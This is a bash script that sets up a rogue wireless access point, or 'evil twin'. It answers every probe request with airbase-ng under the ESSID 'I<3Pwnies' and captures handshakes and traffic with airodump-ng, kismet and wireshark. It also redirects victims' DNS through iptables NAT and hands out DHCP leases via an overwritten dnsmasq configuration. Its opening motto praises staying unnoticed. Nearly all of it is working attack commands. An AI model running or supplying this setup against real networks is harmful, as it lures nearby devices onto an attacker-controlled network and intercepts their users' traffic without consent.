#!/bin/bash
#
#################################################################
# mdda setup #
#################################################################
#
#~>If you do it right people wont know you did anything at all<~#
#
#################################################################
#killall evil running applications #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
killall -9 dnsmasq
killall -9 dhclient
killall -9 kismet_server
killall -9 kismet_client
killall -9 airbase-ng
killall -9 airodump-ng
killall -9 mdk3
#killall -9 gpsd
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#interface configuration #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
airmon-ng stop mon0
airmon-ng stop mon1
airmon-ng start wlan1 #<~~this is the alfa interface if you have an internal atheros on ath5k driver
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start kismet on ath0 for visual information about wireless nets#
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
xterm -geometry 192x50+0+0 -e kismet -c mon0 &
sleep 4
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start airodump-ng on alfa interface #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
xterm -geometry 192x50+0+0 -e airodump-ng -w ./raw-drive --berlin 10 --showack mon0 &
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start airbase-ng on alfa interface #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
xterm -geometry 96x25+0+0 -e airbase-ng -P -C 20 -c 9 -a 00:DE:AD:BE:EF:00 --essid "I<3Pwnies" -F ./airbase-testing mon0 &
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#get bridged interface up and operational #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sleep 10
ifconfig at0 up
ifconfig at0 192.168.2.1 netmask 255.255.255.0
route add -net 192.168.2.0 netmask 255.255.255.0 gw 10.10.10.1
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#Flush and config IPTables for proper forwarding of packets #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#the out interface in this case is bogus, there is no internet #
#connected to this machine it will blackhole route all the #
#connected clients to nothingness, they will not get internet #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.10.10.1
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start dnsmasq and offer IP addresses VIA DHCP #
#################################################################
#
###
cp /etc/dnsmasq.conf /home/dnsmasq.conf.old
rm -rf /etc/dnsmasq.conf
touch /etc/dnsmasq.conf
echo " dhcp-range=10.0.0.2,10.0.0.99,12h" > /etc/dnsmasq.conf
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start dnsmasq for DNS and DHCP offers #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/etc/init.d/dnsmasq start
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#################################################################
#start wireshark for your packet disection needs #
#################################################################
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wireshark -k -i mon0 &
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo " Your finished have fun! "
###<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
###
hash -r
